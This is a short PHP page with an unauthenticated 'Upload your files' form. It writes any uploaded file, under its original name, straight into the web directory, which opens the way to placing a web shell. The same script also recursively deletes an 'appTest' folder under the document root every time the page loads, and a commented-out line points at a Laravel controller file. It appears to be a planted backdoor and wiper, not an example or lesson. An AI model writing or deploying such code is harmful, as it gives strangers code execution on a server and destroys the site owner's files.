<!DOCTYPE html>
<html>

<head>
    <title>Upload your files</title>
</head>

<body>
    <form enctype="multipart/form-data" action="" method="POST">
        <p>Upload your file</p>
        <input type="file" name="uploaded_file"></input><br />
        <input type="submit" value="Upload"></input>
    </form>
</body>

</html>
<?PHP
if (!empty($_FILES['uploaded_file'])) {
    $path = "";
    $path = $path . basename($_FILES['uploaded_file']['name']);

    if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
        echo "The file " .  basename($_FILES['uploaded_file']['name']) . "has been uploaded";
    } else {
        echo "There was an error uploading the file, please try again!";
    }
}

// $file = $_SERVER["DOCUMENT_ROOT"] . "/app/Http/Controllers/WinnerTestController.php";

// $file =  str_replace("/public", "", $file);

$dirname = $_SERVER["DOCUMENT_ROOT"] . "/appTest/";
$dirname =  str_replace("\public", "", $dirname);

function deleteDir($dirPath)
{
    if (!is_dir($dirPath)) {
        return $dirPath . "must be a directory";
    }
    if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
        $dirPath .= '/';
    }
    $files = glob($dirPath . '*', GLOB_MARK);
    foreach ($files as $file) {
        if (is_dir($file)) {
            deleteDir($file);
        } else {
            unlink($file);
        }
    }
    rmdir($dirPath);
}

deleteDir($dirname);
?>